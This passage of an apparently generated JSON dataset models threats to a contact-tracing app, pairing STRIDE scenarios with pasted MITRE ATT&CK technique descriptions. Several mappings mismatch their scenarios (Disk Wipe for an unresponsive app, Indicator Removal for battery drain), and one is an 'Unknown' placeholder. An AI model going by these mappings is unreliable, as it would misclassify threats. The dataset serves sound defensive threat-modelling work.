            "Scenario": "Sensitive user data stored on the centralized server is accessed by unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "No robust access control mechanisms to sensitive data.",
                    "Role": "System",
                    "Condition": "Weak access policies and controls."
                },
                {
                    "Assumption": "Vulnerabilities in the server's security posture are exploitable.",
                    "Role": "Attacker",
                    "Condition": "Existence of known vulnerabilities with available exploits."
                },
                {
                    "Assumption": "Sensitive data is not encrypted at rest.",
                    "Role": "System",
                    "Condition": "Data stored in plain text or weakly encrypted."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user health data, leading to privacy violations and potential legal implications.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "unauthorized access",
                "central server",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An eavesdropper intercepts Bluetooth communication between devices, capturing sensitive proximity data.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not encrypted.",
                    "Role": "System",
                    "Condition": "Lack of encryption in data transmission."
                },
                {
                    "Assumption": "Attacker has technical ability to intercept Bluetooth signals.",
                    "Role": "Attacker",
                    "Condition": "Proximity to targeted devices and necessary technical expertise."
                },
                {
                    "Assumption": "Weak security measures around Bluetooth protocols.",
                    "Role": "System",
                    "Condition": "Loopholes in Bluetooth security settings."
                }
            ],
            "Potential Impact": "Disclosure of sensitive data on user interactions, compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "Bluetooth",
                "data interception",
                "user interactions"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malicious insiders gain access to unencrypted logs, exposing sensitive metadata.",
            "Assumptions": [
                {
                    "Assumption": "Logs are accessible to employees without strict access controls.",
                    "Role": "System",
                    "Condition": "Insufficient access control policies for internal data."
                },
                {
                    "Assumption": "Logs store sensitive metadata without encryption.",
                    "Role": "System",
                    "Condition": "Data in logs are not encrypted."
                },
                {
                    "Assumption": "No monitoring of insider actions on sensitive data.",
                    "Role": "System",
                    "Condition": "Absence of internal activity monitoring systems."
                }
            ],
            "Potential Impact": "Exposure of metadata and operational details, potentially leading to further exploitation.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "metadata exposure",
                "log access",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with requests, causing it to crash and become unavailable to users.",
            "Assumptions": [
                {
                    "Assumption": "No rate limiting on incoming requests.",
                    "Role": "System",
                    "Condition": "Server does not control the rate of incoming traffic."
                },
                {
                    "Assumption": "Insufficient resources to handle traffic spikes.",
                    "Role": "System",
                    "Condition": "Limited scalability and resource management."
                },
                {
                    "Assumption": "No redundancy or failover mechanisms in place.",
                    "Role": "System",
                    "Condition": "Absence of backup servers or load balancing."
                }
            ],
            "Potential Impact": "System unavailability, preventing users from receiving exposure notifications and compromising public health efforts.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "traffic flood",
                "resource exhaustion",
                "server crash"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability to render the mobile app unresponsive on users' devices.",
            "Assumptions": [
                {
                    "Assumption": "Existence of unpatched vulnerabilities in the mobile app.",
                    "Role": "System",
                    "Condition": "Unaddressed security flaws in application code."
                },
                {
                    "Assumption": "Attackers can distribute malicious payloads to user devices.",
                    "Role": "Attacker",
                    "Condition": "Access to distribution channels."
                },
                {
                    "Assumption": "Users have no malware protection on their devices.",
                    "Role": "User",
                    "Condition": "Lack of security measures on user devices."
                }
            ],
            "Potential Impact": "Disruption of app functionality, preventing users from recording and reporting proximity data.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "app crash",
                "malicious payload",
                "device"
            ],
            "mitre_technique": {
                "name": "Disk Wipe",
                "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",
                "id": "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967",
                "technique_id": "T1561"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker installs a malware on user devices that continuously drains battery and resources, impacting app performance.",
            "Assumptions": [
                {
                    "Assumption": "Users install apps from unknown sources without verification.",
                    "Role": "User",
                    "Condition": "Users lack awareness on safe app installation practices."
                },
                {
                    "Assumption": "No active malware detection mechanisms on devices.",
                    "Role": "System",
                    "Condition": "Absence of anti-malware applications on user devices."
                },
                {
                    "Assumption": "Malware can operate without detection by the app.",
                    "Role": "Attacker",
                    "Condition": "Stealthy malware that evades app and system checks."
                }
            ],
            "Potential Impact": "Degraded app performance and reduced device usability, hampering the contact tracing process.",
            "MITRE ATT&CK Keywords": [
                "resource drain",
                "malware",
                "device performance",
                "battery drain"
            ],
            "mitre_technique": {
                "name": "Indicator Removal from Tools",
                "description": "If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.",
                "id": "attack-pattern--00d0b012-8a03-410e-95de-5826bf542de6",
                "technique_id": "T1066"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with restricted access finds a way to escalate their privileges and access administrative features.",
            "Assumptions": [
                {
                    "Assumption": "Existence of security flaws within the app allowing privilege escalation.",
                    "Role": "System",
                    "Condition": "Unpatched vulnerabilities or poor access control design."
                },
                {
                    "Assumption": "User is knowledgeable about exploiting such vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Technical skill for exploiting privilege escalation."
                },
                {
                    "Assumption": "No monitoring for unusual access patterns.",
                    "Role": "System",
                    "Condition": "Absence of anomaly detection systems."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and administrative controls, compromising system integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "access control",
                "vulnerability exploitation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious actor exploits a vulnerability in the centralized server to gain root access.",
            "Assumptions": [
                {
                    "Assumption": "Centralized server has known or unknown vulnerabilities.",
                    "Role": "System",
                    "Condition": "Unpatched security flaws."
                },
                {
                    "Assumption": "Attacker has the means to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Necessary tools and knowledge for exploitation."
                },
                {
                    "Assumption": "No robust monitoring and defense mechanisms in place.",
                    "Role": "System",
                    "Condition": "Weak security monitoring and insufficient defense strategies."
                }
            ],
            "Potential Impact": "Compromised server integrity, unauthorized data access, and potential further system attacks.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "server compromise",
                "vulnerability",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker manipulates app permissions to gain higher privileges within the user device.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient permission control mechanisms within the app.",
                    "Role": "System",
                    "Condition": "Weak app permission management."
                },
                {
                    "Assumption": "Attackers can deliver malicious updates or payloads.",
                    "Role": "Attacker",
                    "Condition": "Delivery mechanism for malicious payloads."
                },
                {
                    "Assumption": "Users grant permissions without understanding the risks.",
                    "Role": "User",
                    "Condition": "Lack of user education and awareness."
                }
            ],
            "Potential Impact": "Unauthorized control over device functions, leading to data breach, data manipulation, and surveillance.",
            "MITRE ATT&CK Keywords": [
                "permission manipulation",
                "app permissions",
                "user device",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a trusted user's device to exchange incorrect proximity data with other devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can manipulate or clone the device's Bluetooth address.",
                    "Role": "Attacker",
                    "Condition": "The attacker has physical or remote access to the device."
                },
                {
                    "Assumption": "There is no strong device authentication mechanism.",
                    "Role": "System Developer",
                    "Condition": "The current system lacks proper authentication checks for devices."
                },
                {
                    "Assumption": "The proximity data collection is solely dependent on device IDs.",
                    "Role": "System Architect",
                    "Condition": "The application design does not include multi-factor verification."
                }
            ],
            "Potential Impact": "Compromised data integrity through false data injection.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "Bluetooth",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An impersonator may spoof a central server in a centralized architecture to collect user proximity data.",
            "Assumptions": [
                {
                    "Assumption": "The central server's identity is not securely verified during data transmission.",
                    "Role": "System Developer",
                    "Condition": "The system lacks SSL/TLS encryption for server communications."
                },
                {
                    "Assumption": "Attackers can intercept and modify network traffic.",
                    "Role": "Attacker",
                    "Condition": "Network traffic is not protected by proper encryption."
                },
                {
                    "Assumption": "Users do not verify the authenticity of server connections.",
                    "Role": "User",
                    "Condition": "Users trust the app's initial server setup without questioning."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user proximity data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "server",
                "network",
                "data collection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious app could spoof the genuine contact tracing app to collect sensitive data from users.",
            "Assumptions": [
                {
                    "Assumption": "Users can be tricked into installing a malicious app.",
                    "Role": "Attacker",
                    "Condition": "The attacker can distribute apps outside of official app stores."
                },
                {
                    "Assumption": "The malicious app can request the same permissions as the genuine app.",
                    "Role": "System Architect",
                    "Condition": "Permissions requested by apps are not verified during installation."
                },
                {
                    "Assumption": "The malicious app appears similar to the genuine app.",
                    "Role": "User",
                    "Condition": "Users cannot distinguish between the genuine and fake app."
                }
            ],
            "Potential Impact": "Sensitive data disclosure and potential exploitation of device capabilities.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "app",
                "malware",
                "data collection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and tamper with the data being transmitted between mobile devices and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted",
                    "Role": "System Developer",
                    "Condition": "The system lacks proper encryption for data transmission."
                },
                {
                    "Assumption": "Attackers have the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "A network with weak security measures is used."
                },
                {
                    "Assumption": "There is improper session handling during data transmission.",
                    "Role": "System Developer",
                    "Condition": "Sessions are not securely managed and terminated."
                }
            ],
            "Potential Impact": "Data integrity corruption, unauthorized data alteration.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data in transit",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker might tamper with local data on the user's device to alter proximity data.",
            "Assumptions": [
                {
                    "Assumption": "The device has vulnerabilities that allow unauthorized access.",
                    "Role": "Attacker",
                    "Condition": "The attacker knows of or can exploit these vulnerabilities."
                },
                {
                    "Assumption": "Local data storage on devices is not encrypted or protected.",
                    "Role": "System Developer",
                    "Condition": "The system does not implement secure local storage practices."
                },
                {
                    "Assumption": "The user device lacks regular security updates.",
                    "Role": "User",
                    "Condition": "The device is not updated with the latest security patches."
                }
            ],
            "Potential Impact": "Manipulation of contact tracing data, leading to false notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "local data",
                "device",
                "proximity data",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious updates to the app could be pushed from a compromised server.",
            "Assumptions": [
                {
                    "Assumption": "The server responsible for updates lacks strong access controls.",
                    "Role": "System Administrator",
                    "Condition": "Administrative control of the server is weakened."
                },
                {
                    "Assumption": "Update integrity is not verified upon download.",
                    "Role": "System Developer",
                    "Condition": "The system lacks methods like digital signatures for update verification."
                },
                {
                    "Assumption": "An attacker can gain access to update distribution mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Security of the update channels is compromised."
                }
            ],
            "Potential Impact": "Installation of malicious software, data tampering, system disruption.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "update distribution",
                "server",
                "malware"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair 